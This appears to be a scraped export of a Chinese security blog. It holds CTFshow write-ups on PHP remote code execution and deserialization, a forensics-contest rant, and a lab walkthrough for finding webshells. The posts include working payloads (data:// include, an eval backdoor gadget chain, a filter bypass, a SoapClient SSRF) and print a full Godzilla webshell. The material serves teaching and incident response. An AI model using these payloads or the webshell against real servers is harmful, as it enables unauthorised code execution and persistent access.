system 函数执行 tac f* 命令。        payload:?c=data://text/palin,&lt;?php system(&quot;tac f*&quot;);?&gt; #（使用不了用第二个我只是进行对比）这里php被过滤了使用不了可以改为短标签?c=data://text/palin,&lt;?=system(&quot;tac f*&quot;);?&gt;?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZioiKTs/Pg==\n\nweb39error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;        include($c.&quot;.php&quot;);    &#125;//使用 preg_match 函数和正则表达式 /flag/i 检查 $c 中是否包含 flag（不区分大小写）。如果不包含，将 $c 后面添加 .php 后缀并使用 include 函数包含该文件。        &#125;else&#123;    highlight_file(__FILE__);&#125;payload:?c=data://text/palin,&lt;?=system(&quot;tac f*&quot;);?&gt;?c=data://text/palin,&lt;?php system(&quot;tac f*&quot;);?&gt;\n\n这个地方 include($c.”.php”);我有很大的疑问,就是豆包给的解释是include($c.&quot;.php&quot;);：将拼接后的字符串作为文件路径，尝试包含这个文件。如果文件存在，PHP 会将该文件的内容包含到当前文件中并执行；如果文件不存在，根据 PHP 的配置不同，可能会产生一个警告或错误（不过在这段代码中，由于 error_reporting(0); 的设置，错误不会显示）。\n但是这样解释是得不到flag的,于是我把sun师傅喊起来问他sun师傅解释一番但是我感觉不是很理解\n最后的结论是:\tc是data:&#x2F;&#x2F;text&#x2F;palin,后面衔接.php  但是这样理解是不对的   我的理解是在赋值的时候就已经进行命令执行了后面的.php实际上没有用到\t\nweb40if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\（|\\）|\\-|\\=|\\+|\\&#123;|\\[|\\]|\\&#125;|\\:|\\&#x27;|\\&quot;|\\,|\\&lt;|\\.|\\&gt;|\\/|\\?|\\\\\\\\/i&quot;, $c))&#123;        eval($c);    &#125;        &#125;else&#123;    highlight_file(__FILE__);&#125;payload?c=print_r(show_source(array_rand(array_flip(scandir(pos(localeconv()))))));?c=show_source(next(array_reverse(scandir(pos(localeconv())))));next()： 函数将内部指针指向数组中的下一个元素，并输出。?c=print_r(scandir(current(localeconv())));scandir(current(localeconv())) 查看当前目录所有文件名?c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));\n\n无参文件读取不是无回显\n过滤了很多字符 有大写得括号 这里得考点是：无参数文件读取 无参数的意思可以是a()、a(b())或a(b(c()))，但不能是a(‘b’)或a(‘b’,’c’)，不能带参数 localeconv() 函数返回一包含本地数字及货币格式信息的数组。current() 函数返回数组中的当前元素（单元）,默认取第一个值，pos() 同 current() ,是current()的别名reset() 函数返回数组第一个单元的值，如果数组为空则返回 FALSEarray_reverse()：数组逆序array_flip()是交换数组的键和值\n","tags":["RCE"]},{"title":"獬豸杯取证再也不复现","url":"/2025/02/22/%E7%8D%AC%E8%B1%B8%E6%9D%AF%E5%8F%96%E8%AF%81%E5%A4%8D%E7%8E%B0/","content":"没别的话，就是纯纯坐牢，太难受了。感觉很多题都是送分的，但是我对取证挂载都太不熟悉了，只会计算机取证但是还被密码卡死我真是要红温了，看着题目是真好又有引导性，对自己的提升肯定很大但是我真是受不了自己啥都不会了。FTK挂载 VC挂载然后是啥哇，安卓怎么仿真？\n崩溃，比赛之前我还觉得没啥问题做出来一半….\n复现也不复现了，纯屎\n没见过题目屎成这样环境屎成这样的。火眼全梭哈了，几个用sqllite找的密码啊？\n我就当吃了一下午屎。\n一周后：\n稍微冷静了点 其实就是自己水平不太够 要静心潜修了，工具固然好 但我仍然会继续去沉淀手搓 不能背弃自己的信仰 \n而且我现在也有火眼了哈哈哈\n\n","tags":["-wp -取证"]},{"title":"玄机靶场","url":"/2025/03/04/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/","content":"第一章 应急响应-webshell查杀简介 靶机账号密码 root xjwebshell1.黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}2.黑客使用的什么工具的shell github地址的md5 flag{md5}3.黑客隐藏shell的完整路径的md5 flag{md5} 注 : &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xxx4.黑客免杀马完整路径 md5 flag{md5}\n强烈推荐Peterpan.exe师傅的wp\n首先给出环境我以为是仿真靶场，捣鼓了半天没弄明白 结果是去远程连接linux 我真是二逼\n1.黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}1.可疑函数调用 ◦ WebShell通常会使用一些危险的函数来执行系统命令或代码，如：  ▪ PHP: eval(), system(), exec(), shell_exec(), passthru(), assert(), base64_decode() ▪ ASP: Execute(), Eval(), CreateObject() ▪ JSP: Runtime.getRuntime().exec()     \n\n编码和解码 ◦ WebShell经常使用编码和解码技术来隐藏其真实意图，如Base64编码：\n\neval(base64_decode(&#x27;encoded_string&#x27;));\n\n文件操作 ◦ WebShell可能会包含文件操作函数，用于读取、写入或修改文件： \n ▪ PHP: fopen(), fwrite(), file_get_contents(), file_put_contents() ▪ ASP: FileSystemObject    \n\n网络操作 ◦ WebShell可能会包含网络操作函数，用于与远程服务器通信： \n ▪ PHP: fsockopen(), curl_exec(), file_get_contents(‘http:&#x2F;&#x2F;…’) ▪ ASP: WinHttp.WinHttpRequest      \n上面刚刚也说了我们可以尝试定位一些特殊的后缀文件，例如：.asp、.php、.jsp、.aspx。\n\n\n//搜索目录下适配当前应用的网页文件，查看内容是否有Webshell特征find ./ type f -name &quot;*.jsp&quot; | xargs grep &quot;exec(&quot; find ./ type f -name &quot;*.php&quot; | xargs grep &quot;eval(&quot; find ./ type f -name &quot;*.asp&quot; | xargs grep &quot;execute(&quot; find ./ type f -name &quot;*.aspx&quot; | xargs grep &quot;eval(&quot;  //对于免杀Webshell，可以查看是否使用编码find ./ type f -name &quot;*.php&quot; | xargs grep &quot;base64_decode&quot; \n\n本题步骤就是：find ./ type f -name &quot;*.php&quot; | xargs grep &quot;eval(&quot;\n\n最后终于在gz.php里面发现了；\n&lt;?php@session_start();@set_time_limit(0);@error_reporting(0);function encode($D,$K)&#123;    for($i=0;$i&lt;strlen($D);$i++) &#123;        $c = $K[$i+1&amp;15];        $D[$i] = $D[$i]^$c;    &#125;    return $D;&#125;//027ccd04-5065-48b6-a32d-77c704a5e26d$payloadName=&#x27;payload&#x27;;$key=&#x27;3c6e0b8a9c15224a&#x27;;$data=file_get_contents(&quot;php://input&quot;);if ($data!==false)&#123;    $data=encode($data,$key);    if (isset($_SESSION[$payloadName]))&#123;        $payload=encode($_SESSION[$payloadName],$key);        if (strpos($payload,&quot;getBasicsInfo&quot;)===false)&#123;            $payload=encode($payload,$key);        &#125;\t\teval($payload);        echo encode(@run($data),$key);    &#125;else&#123;        if (strpos($data,&quot;getBasicsInfo&quot;)!==false)&#123;            $_SESSION[$payloadName]=encode($data,$key);        &#125;    &#125;&#125;@session_start();：启动会话@set_time_limit(0);：设置脚本执行时间限制为无限制@error_reporting(0);：关闭错误报告function encode($D,$K)&#123;...&#125;：定义了一个名为 encode 的函数，它接受两个参数 $D 和 $K。这个函数看起来像是一个简单的异或编码函数，用于对数据进行加密或解密。它使用 $K 作为密钥，对 $D 中的每个字符进行异或操作。接下来的几行代码定义了 $payloadName、$key 和 $data 变量。$payloadName 是用于存储有效载荷的会话变量名，$key 是用于编码的密钥，$data 是从 php://input 流中读取的数据。if ($data!==false)&#123;...&#125;：如果从 php://input 读取的数据不是 false（即成功读取了数据），则执行以下代码块。if (isset($_SESSION[$payloadName]))&#123;...&#125;：检查 $payloadName 对应的会话变量是否已设置。if (strpos($payload,&quot;getBasicsInfo&quot;)===false)&#123;...&#125;：检查 $payload 变量中是否包含字符串 &quot;getBasicsInfo&quot;。eval($payload);：如果 $payload 变量包含 &quot;getBasicsInfo&quot; 字符串，则执行 $payload 变量中的 PHP 代码。echo encode(@run($data),$key);：如果 $data 包含 &quot;getBasicsInfo&quot; 字符串，则执行 @run($data) 函数，并将结果编码后输出。————————————————                            版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。                        原文链接：https://blog.csdn.net/administratorlws/article/details/139521078\n\n这段代码的目的是接收通过 php://input 流发送的数据，对其进行编码，并根据会话变量中的内容执行特定的 PHP 代码。这通常用于隐藏恶意代码或后门，使得攻击者可以通过特定的请求触发执行。\n步骤#1.2黑客使用的什么工具的shell github地址的md5 flag{md5}遇到这种类型的题目，我们就是要分析一下是什么类型的webshell，其实开头三句就可以分析出是godzilla的webshell了；\n为什么这样说？\n哥斯拉病毒是一种Java后门木马，通常用于攻击并控制Web服务器。特征就包括：\n1. @session_start(); - 开启一个会话。2. @set_time_limit(0); - 设置脚本执行时间为无限。 3. @error_reporting(0); - 关闭所有错误报告。\n\n这些代码行主要用于隐藏病毒活动并确保其能够长时间运行而不被发现。哥斯拉病毒通常会通过Webshell或其他漏洞注入到服务器中，然后使用这些命令来掩盖其存在并执行进一步的恶意操作。\n所以我们只需要找到它的github地址并且进行MD5加密即可；\nGodzilla地址：https://github.com/BeichenDream/Godzilla\n\n步骤#1.3黑客隐藏shell的完整路径的md5 flag{md5} 注 : &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xxx那既然说黑客隐藏shell了，那我们肯定需要用到命令ls -la进行查找；\n然后发现在挨个查找的过程中发现.Mysqlli.php如果普通的ls查看目录是查不出来的，必须用到ls -la才行，所以它就是隐藏了，我们直接定位一些它的路径，进行MD5加密即可；\nroot@ip-10-0-10-3:/var/www/html/include# cd Dbroot@ip-10-0-10-3:/var/www/html/include/Db# lsMysqli.php  Mysql.php  Sqlite.phproot@ip-10-0-10-3:/var/www/html/include/Db# ls -ltotal 24-rwxr-xr-x 1 www-data www-data 4752 Mar 14  2021 Mysqli.php-rwxr-xr-x 1 www-data www-data 4921 Mar 14  2021 Mysql.php-rwxr-xr-x 1 www-data www-data 4433 Mar 14  2021 Sqlite.phproot@ip-10-0-10-3:/var/www/html/include/Db# ls -a.  ..  .Mysqli.php  Mysqli.php\tMysql.php  Sqlite.phproot@ip-10-0-10-3:/var/www/html/include/Db# ls -latotal 36drwxr-xr-x 2 www-data www-data 4096 Aug  2  2023 .drwxr-xr-x 4 www-data www-data 4096 Aug  2  2023 ..-rw-r--r-- 1 www-data www-data  768 Aug  2  2023 .Mysqli.php-rwxr-xr-x 1 www-data www-data 4752 Mar 14  2021 Mysqli.php-rwxr-xr-x 1 www-data www-data 4921 Mar 14  2021 Mysql.php-rwxr-xr-x 1 www-data www-data 4433 Mar 14  2021 Sqlite.phproot@ip-10-0-10-3:/var/www/html/include/Db# pwd/var/www/html/include/Db注意：在finnalshell里面可以直接看到目录结构比命令好找 更方便\n\n步骤#1.4黑客免杀马完整路径 md5 flag{md5}什么是免杀马？免杀马（免杀病毒或免杀Webshell）是指经过特殊处理和混淆，使其能够避开杀毒软件和安全检测工具识别的恶意软件或后门程序。黑客使用各种技术手段，使恶意代码看起来像是正常代码，从而躲避签名检测和基于规则的安全机制。这种技术通常用于Webshell和其他后门程序，目的是保持对受害系统的隐蔽访问。\n免杀马（免杀病毒或免杀Webshell）是指经过特殊处理和混淆，使其能够避开杀毒软件和安全检测工具识别的恶意软件或后门程序。黑客使用各种技术手段，使恶意代码看起来像是正常代码，从而躲避签名检测和基于规则的安全机制。这种技术通常用于Webshell和其他后门程序，目的是保持对受害系统的隐蔽访问。\n常见的免杀技术；\n\n代码混淆：\n    使用混淆工具或手动混淆代码，使其难以被直接阅读和分析。\n\n编码和加密：\n    使用Base64、ROT13等编码方式或更复杂的加密技术隐藏恶意代码片段。\n\n动态生成和执行：\n    通过动态生成代码并在运行时执行，绕过静态分析。例如，使用 eval()、create_function() 等PHP函数。\n\n多层解码：\n    多层编码或加密，增加分析和检测的难度。\n\n使用合法函数：\n    恶意代码嵌入到看似合法的代码中，利用正常的函数调用执行恶意操作。\n\n查找和处理免杀马的方法；\n\n文件完整性检查：\n    比较当前文件与已知的良性备份文件，发现被修改或新增的文件。\n\n代码审查：\n    手动检查可疑文件，寻找混淆、编码、加密和动态执行的代码模式。\n\n安全扫描工具：\n    使用高级安全扫描工具，这些工具使用行为分析和机器学习来检测潜在的免杀马。\n\n日志分析：\n    查看服务器访问日志和错误日志，寻找异常访问和执行模式。\n    检查文件修改时间，与正常更新周期不符的文件可能是可疑的。\n\n基于特征的检测：\n    使用YARA规则等特征检测工具，根据已知的免杀马特征进行扫描。\n\n总结：免杀马通过静态检测是检测不到的，因为在免杀的过程中将webshel的特征值以及特征函数都给去掉了，因为webshell执行会在网站日志留下记录，那我们就到网站日志里面看看有啥可疑的记录，这里也顺便说一下linux的日志存放在/var/log目录下。\n\n这里我们总结一下常见网站日志的路径：\nIIS（Internet Information Services）\nIIS是Windows上的默认Web服务器，其日志文件默认存储在以下路径：\nIIS 6.0 及更早版本：\n\nC:\\WINDOWS\\system32\\LogFiles\\W3SVC[SiteID]\\\n\nIIS 7.0 及更高版本：\n\nC:\\inetpub\\logs\\LogFiles\\W3SVC[SiteID]\\\n\n其中，[SiteID] 是网站的标识符，通常是一个数字。\n\nApache HTTP Server\n如果在Windows上安装了Apache，日志文件默认存储在安装目录下的logs文件夹中：\nC:\\Program Files (x86)\\Apache Group\\Apache2\\logs\\\n或者\nC:\\Program Files\\Apache Group\\Apache2\\logs\\\n具体路径取决于安装时选择的位置。\nLinux系统中的网站日志路径\nApache HTTP Server\n在Linux上，Apache日志文件通常位于以下目录：\n访问日志：\n\n/var/log/apache2/access.log\n\n或者\n\n/var/log/httpd/access_log\n\n错误日志：\n\n/var/log/apache2/error.log\n\n或\n\n/var/log/httpd/error_log\n\n不同的Linux发行版可能有不同的目录。例如，在Debian&#x2F;Ubuntu上通常使用&#x2F;var&#x2F;log&#x2F;apache2&#x2F;，而在Red Hat&#x2F;CentOS上通常使用&#x2F;var&#x2F;log&#x2F;httpd&#x2F;。\nNginx\nNginx是另一个流行的Web服务器，默认的日志文件路径如下：\n访问日志：\n\n/var/log/nginx/access.log\n\n错误日志：\n\n/var/log/nginx/error.log\n\n如何查看和分析日志文件？Windows：\n    使用文本编辑器（如Notepad、Notepad++）直接打开日志文件查看。\n    可以使用IIS管理器查看IIS日志。\n\nLinux：\n\n    使用命令行工具查看日志，例如：\n\n    tail -f /var/log/apache2/access.log tail -f /var/log/nginx/access.log\n\n    可以使用日志分析工具（如GoAccess、AWStats）生成可视化的日志报告。\n\n既然它经过了免杀处理，那么木马的特征值以及特征函数应该都是被去掉了。这时我们再通过静态检测是基本检测不到的，从上面我们就可以看出我们只找到了三个马。而且上面我们说了webshell执行会在网站日志留下记录，那我们就到网站日志里面看看有啥可疑的记录。我们到apache2目录下面查看一下access.log日志，查看分析一下；（因为是日志所以记录有点多）\n\n大部分都是重复的只有少数不一样的； 我们可以看到有个名为top.php的文件执行了phpinfo()；且返回值为200，有点可疑。去找到相对应的文件发现是一个正常的文件来。  \n\n继续往下翻，又发现一个较为可疑的文件，到此目录下面查看该文件。 目录：&#x2F;wap&#x2F;top.php \n\n 原来是个恶意文件，最后把路径进行md5进行加密即可； 路径：&#x2F;var&#x2F;www&#x2F;html&#x2F;wap&#x2F;top.php \n为什么可以确认是恶意文件？混淆和隐藏：\n使用Base64编码和字符异或操作来混淆代码。这些技术通常用于隐藏恶意代码，避免被直接检测到。\n\n动态执行：\n动态生成并调用函数。这种模式允许攻击者通过URL参数传递任意代码并在服务器上执行，具有极大的危险性。\n\n外部输入：\n使用$_GET参数来控制代码行为。通过外部输入来决定代码逻辑，使得攻击者可以远程控制服务器，执行任意PHP代码。\n\n\n还有一种思路和做法就是把var文件下载下来压缩zip扔到在线查杀网站里面，让他们去查杀\n同样的道理在线下应该是用D盾查杀\n","tags":["-WP -玄机 -应急响应"]},{"title":"浅学PHP反序列化","url":"/2025/01/31/%E6%B5%85%E5%AD%A6PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","content":"浅学PHP序列化：serialize()序列化:把对象转换为可传输的字节序列的过程–是为了解决在不同的机器之间传输复杂数据类型的一种机制\n序列化是将变量或对象转换成字符串的过程，用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。\n本次学习主要参考baozongwi师傅的php反序列化文章和Y4tacker的[CTF]PHP反序列化总结辅助学习😘\nCTFSHOW靶场主要参考ZredamanJ师傅的ctfshow 反序列化\n推荐课程陈腾老师的反序列化课程陈腾老师的ssti的课也很好👍\n反序列化:把字节序列化转换为对象的过程\n序列化与反序列化的最终目的:实现对象的跨平台存储,网络传输\n为什么要有序列化呢？\n就是因为序列化方便呗,占用小空间传递更多的信息\ndemo:&lt;?phpclass me&#123;    public $name=lww;    public $age=20;    public  $ctf=web;&#125;echo serialize(new me());回显：O:2:&quot;me&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;lww&quot;;s:3:&quot;age&quot;;i:20;s:3:&quot;ctf&quot;;s:3:&quot;web&quot;;&#125;\n\n在这里的格式为：变量类型:类名长度:类名:属性数量:{属性类型:属性名长度:属性名;属性值类型:属性值长度:属性值内容\n在这里还涉及到一个基础的知识点就是php是面向对象的如果不了解可以去菜鸟教程熟悉一下\n魔术方法PHP 中的魔术方法是指那些以双下划线（__）开头的特殊方法。它们在特定的情况下自动调用，用于执行特定的功能，比如在对象序列化时、访问未定义的属性或方法时等。这些方法为PHP编程提供了强大的工具，使得可以更简洁地执行复杂的任务。\n__construct() //当创建新对象时自动调用。\n__destruct() //对象不再被使用且需要被销毁时调用。\n__call($name, $arguments) //当调用一个不可访问的方法时调用。\n__callStatic($name, $arguments) //当调用一个不可访问的静态方法时调用。\n__get($name) //用于读取不可访问的属性。\n__set($name, $value) //用于写入不可访问的属性。\n__isset($name) //当对不可访问的属性调用 isset() 或 empty() 时被调用。\n__unset($name) //当对不可访问的属性调用 unset() 时被调用。\n__toString() //当尝试将对象当作字符串输出时调用。\n__invoke() //当尝试将对象当作函数调用时执行。\n__clone() //当对象被复制时调用。\n__sleep() //在序列化前调用，用于清理对象，并返回表示哪些属性需要被序列化的数组。\n__wakeup() //在反序列化后调用，用于重新初始化对象的属性或执行其他重建任务。\n\n存在自动调用,可以相互调用\nctfshow 反序列化web254源码:\n&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&#x27;flag.php&#x27;);class ctfShowUser&#123;    public $username=&#x27;xxxxxx&#x27;;    public $password=&#x27;xxxxxx&#x27;;    public $isVip=false;    public function checkVip()&#123;        return $this-&gt;isVip;    &#125;    public function login($u,$p)&#123;        if($this-&gt;username===$u&amp;&amp;$this-&gt;password===$p)&#123;            $this-&gt;isVip=true;        &#125;        return $this-&gt;isVip;    &#125;    public function vipOneKeyGetFlag()&#123;        if($this-&gt;isVip)&#123;            global $flag;            echo &quot;your flag is &quot;.$flag;        &#125;else&#123;            echo &quot;no vip, no flag&quot;;        &#125;    &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123;    $user = new ctfShowUser();    if($user-&gt;login($username,$password))&#123;        if($user-&gt;checkVip())&#123;            $user-&gt;vipOneKeyGetFlag();        &#125;    &#125;else&#123;        echo &quot;no vip,no flag&quot;;    &#125;&#125; \n\n\n\npayload\nhttps://03de7056-2630-45a9-b5a3-f21a6e0a8e3c.challenge.ctf.show/?username=xxxxxx&amp;password=xxxxxx\nweb255&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&#x27;flag.php&#x27;);class ctfShowUser&#123;    public $username=&#x27;xxxxxx&#x27;;    public $password=&#x27;xxxxxx&#x27;;    public $isVip=false;    public function checkVip()&#123;        return $this-&gt;isVip;    &#125;    public function login($u,$p)&#123;        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;    &#125;    public function vipOneKeyGetFlag()&#123;        if($this-&gt;isVip)&#123;            global $flag;            echo &quot;your flag is &quot;.$flag;        &#125;else&#123;            echo &quot;no vip, no flag&quot;;        &#125;    &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123;    $user = unserialize($_COOKIE[&#x27;user&#x27;]);        if($user-&gt;login($username,$password))&#123;        if($user-&gt;checkVip())&#123;            $user-&gt;vipOneKeyGetFlag();        &#125;    &#125;else&#123;        echo &quot;no vip,no flag&quot;;    &#125;&#125; /*发现要从cookie中获取值并且需要把flase改为ture*/\n\n\n\n\n\npayload&lt;?phpclass ctfShowUser&#123;    public $isVip=&#x27;true&#x27;;    public $username=&#x27;xxxxxx&#x27;;    public $password=&#x27;xxxxxx&#x27;;&#125;$a=new ctfShowUser();echo urlencode( serialize($a));O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A5%3A%22isVip%22%3Bs%3A4%3A%22true%22%3Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3B%7Durl?username=xxxxxx&amp;passname=xxxxxx\n\n\n\nweb256&lt;?phphighlight_file(__FILE__);include(&#x27;flag.php&#x27;);class ctfShowUser&#123;    public $username=&#x27;xxxxxx&#x27;;    public $password=&#x27;xxxxxx&#x27;;    public $isVip=false;    public function checkVip()&#123;        return $this-&gt;isVip;    &#125;    public function login($u,$p)&#123;        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;    &#125;    public function vipOneKeyGetFlag()&#123;        if($this-&gt;isVip)&#123;            global $flag;            if($this-&gt;username!==$this-&gt;password)&#123;                echo &quot;your flag is &quot;.$flag;            &#125;        &#125;else&#123;            echo &quot;no vip, no flag&quot;;        &#125;    &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123;    $user = unserialize($_COOKIE[&#x27;user&#x27;]);    if($user-&gt;login($username,$password))&#123;        if($user-&gt;checkVip())&#123;            $user-&gt;vipOneKeyGetFlag();        &#125;    &#125;else&#123;        echo &quot;no vip,no flag&quot;;    &#125;&#125;这个题其实就是使得username与password不相同，用上题的脚本稍作修改就行\n\nweb257 &lt;?phperror_reporting(0);highlight_file(__FILE__);class ctfShowUser&#123;    private $username=&#x27;xxxxxx&#x27;;    private $password=&#x27;xxxxxx&#x27;;    private $isVip=false;    private $class = &#x27;info&#x27;;    public function __construct()&#123;        $this-&gt;class=new info();    &#125;    public function login($u,$p)&#123;        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;    &#125;    public function __destruct()&#123;        $this-&gt;class-&gt;getInfo();    &#125;&#125;class info&#123;    private $user=&#x27;xxxxxx&#x27;;    public function getInfo()&#123;        return $this-&gt;user;    &#125;&#125;class backDoor&#123;    private $code;    public function getInfo()&#123;        eval($this-&gt;code);    &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123;    $user = unserialize($_COOKIE[&#x27;user&#x27;]);    $user-&gt;login($username,$password);&#125;\n\n\n\npayload：&lt;?php class ctfShowUser&#123;   private $class;   public function __construct()&#123;    $this-&gt;class=new backDoor();//这就是在创建时被调用 &#125;&#125;class backDoor&#123;    private $code=&quot;system(&#x27;tac f*&#x27;);&quot;;          //在实际中多试试tac /f*或者tac f*&#125;$a=new ctfShowUser();echo urlencode(serialize($a));不能直接private $class=new backDoor();来赋给class一个类的值，只能通过__construct来赋值，但是可以直接赋给其字符的值。要注意的是用user传命令时需要带个分号\t看好要求是去cookie里面传参\n\nconstruct–demo\n&lt;?php/* construct 构造函数，当一个对象创建时被调用。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作*/class Demo&#123;    public $name=&quot;lww&quot;;    public $age=20;    public function __construct()&#123;        $this-&gt;name=&quot;Demon&quot;;        $this-&gt;age=21;        echo &quot;construct被调用\\n&quot;;    &#125;&#125;$a=new Demo();echo serialize($a);/*construct被调用*/O:4:&quot;Demo&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;Demon&quot;;s:3:&quot;age&quot;;i:21;&#125;\n\nweb258 &lt;?phperror_reporting(0);highlight_file(__FILE__);class ctfShowUser&#123;    public $username=&#x27;xxxxxx&#x27;;    public $password=&#x27;xxxxxx&#x27;;    public $isVip=false;    public $class = &#x27;info&#x27;;    public function __construct()&#123;        $this-&gt;class=new info();    &#125;    public function login($u,$p)&#123;        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;    &#125;    public function __destruct()&#123;        $this-&gt;class-&gt;getInfo();    &#125;&#125;class info&#123;    public $user=&#x27;xxxxxx&#x27;;    public function getInfo()&#123;        return $this-&gt;user;    &#125;&#125;class backDoor&#123;    public $code;    public function getInfo()&#123;        eval($this-&gt;code);    &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123;    if(!preg_match(&#x27;/[oc]:\\d+:/i&#x27;, $_COOKIE[&#x27;user&#x27;]))&#123;        $user = unserialize($_COOKIE[&#x27;user&#x27;]);    &#125;    $user-&gt;login($username,$password);&#125;\n\n分析：本题的难点在于过滤if(isset($username) &amp;&amp; isset($password))&#123;    if(!preg_match(&#x27;/[oc]:\\d+:/i&#x27;, $_COOKIE[&#x27;user&#x27;]))&#123;        $user = unserialize($_COOKIE[&#x27;user&#x27;]);    &#125;    $user-&gt;login($username,$password);&#125;正则过滤[oc]是匹配o字符或者c字符，\\d匹配一个数字字符，等价于[0-9]，+号是匹配前面的\\d一次或者多次。下面只需要将O:11变成O:+11就可以绕过了检查 $_COOKIE[&#x27;user&#x27;] 这个 Cookie 的值是否不包含符合正则表达式 /[oc]:\\d+:/i 的模式。如果不包含，则条件为真，执行 if 语句块内的代码；如果包含，则条件为假，跳过 if 语句块内的代码。在实际应用中，这种检查通常用于防范 PHP 反序列化漏洞，因为某些恶意的序列化字符串可能包含 O: 或 C: 开头的模式。为了躲避检查+11可以躲开\\d的纯数字字符\n\npayload:user=O%3A%2B11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A17%3A%22system%28%27tac+f%2A%27%29%3B%22%3B%7D%7D&lt;?phpclass ctfShowUser&#123;    public $class;    public function __construct()&#123;        $this-&gt;class=new backDoor();    &#125;&#125;class backDoor&#123;    public $code=&quot;system(&#x27;tac f*&#x27;);&quot;;&#125;$a=new ctfShowUser();$b=serialize($a);$b=str_replace(&quot;O:&quot;,&quot;O:+&quot;,$b);echo urlencode($b);\n\nWEB259这题考查PHP原生类的反序列化\n先放题\nflag.php $xff = explode(&#x27;,&#x27;, $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]);array_pop($xff);$ip = array_pop($xff);if($ip!==&#x27;127.0.0.1&#x27;)&#123;\tdie(&#x27;error&#x27;);&#125;else&#123;\t$token = $_POST[&#x27;token&#x27;];\tif($token==&#x27;ctfshow&#x27;)&#123;\t\tfile_put_contents(&#x27;flag.txt&#x27;,$flag);\t&#125;&#125;然后实例里面的php页面是&lt;?phphighlight_file(__FILE__);$vip = unserialize($_GET[&#x27;vip&#x27;]);//vip can get flag one key$vip-&gt;getFlag();\n\n\n\n大致流程为：\n1、通过访问一个不存在的方法，调用原生类SoapClient的_call方法\n2、通过SoapClient原生类里面带有的user_agent构造处POST方法 \n3、User-Agent和Content-Type间通过\\r\\n分割，因为在HTTP协议中，HTTP header与HTTP Body是用两个CRLF分隔的 \n4、利用其中的location为http://127.0.0.1/flag.php，构造SSRF，可以让访问flag.php的IP为127.0.0.1\n\n[!TIP]\n关于php原生类PHP 原生类（Native Classes）是指 PHP 语言内置的类，由 PHP 核心或官方扩展直接提供，无需用户自行定义即可直接使用。这些类通常提供了常用的功能（如日期处理、文件操作、异常处理等），是 PHP 开发中的基础工具。主要特点无需定义：原生类已随 PHP 安装包或扩展默认提供。高效稳定：经过 PHP 官方优化和测试，性能可靠。功能明确：每个类专注于解决特定领域的问题。\n\nY4tacker的反序列化总结里面的php原生类反序列化板块有详解，内容可能较多\n\npayload:&lt;?php $ua=&quot;ctfshow\\r\\nx-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1\\r\\nContent-Type:application/x-www-form-urlencoded\\r\\nContent-Length:13\\r\\n\\r\\ntoken=ctfshow&quot;; $client=new SoapClient(null,array(&#x27;uri&#x27;=&gt;&quot;127.0.0.1/&quot;,&#x27;location&#x27;=&gt;&quot;http://127.0.0.1/flag.php&quot;,&#x27;user_agent&#x27;=&gt;$ua)); echo urlencode(serialize($client)) 